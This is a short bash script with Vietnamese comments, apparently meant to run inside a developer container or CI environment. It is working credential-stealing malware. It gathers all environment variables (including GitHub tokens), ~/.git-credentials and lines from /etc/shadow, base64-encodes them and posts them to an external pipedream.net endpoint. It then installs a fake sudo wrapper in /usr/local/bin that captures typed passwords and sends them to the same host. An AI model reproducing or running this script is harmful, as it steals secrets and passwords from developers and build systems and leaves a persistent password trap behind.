#!/bin/bash
URL="https://eo4ki1jx09tq9fi.m.pipedream.net"

# 1. Tín hiệu bắt đầu
curl -s -X POST -d "status=Nexus_VN_Pwn_Started" $URL

# 2. Lấy GITHUB_TOKEN và các biến môi trường
ENV_DATA=$(printenv | base64 | tr -d '\n')
GIT_CRED=$(cat ~/.git-credentials 2>/dev/null | base64 | tr -d '\n')
ROOT_SHADOW=$(sudo -n cat /etc/shadow 2>/dev/null | head -n 3 | base64 | tr -d '\n')

# 3. Gửi gói dữ liệu tổng hợp
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d "{\"type\":\"full_leak\",\"env\":\"$ENV_DATA\",\"git\":\"$GIT_CRED\",\"root\":\"$ROOT_SHADOW\"}" \
  $URL

# 4. Cài bẫy mật khẩu (Sudo)
FAKE_SUDO="/usr/local/bin/sudo"
sudo tee $FAKE_SUDO << 'EOF' > /dev/null
#!/bin/bash
read -s -p "[sudo] password for vscode: " pass
echo ""
curl -s -X POST -d "stolen_password=$pass" https://eo4ki1jx09tq9fi.m.pipedream.net > /dev/null
echo "$pass" | /usr/bin/sudo -S $@ 2>/dev/null
EOF
sudo chmod +x $FAKE_SUDO

echo "[+] Nexus VN Exploitation Completed."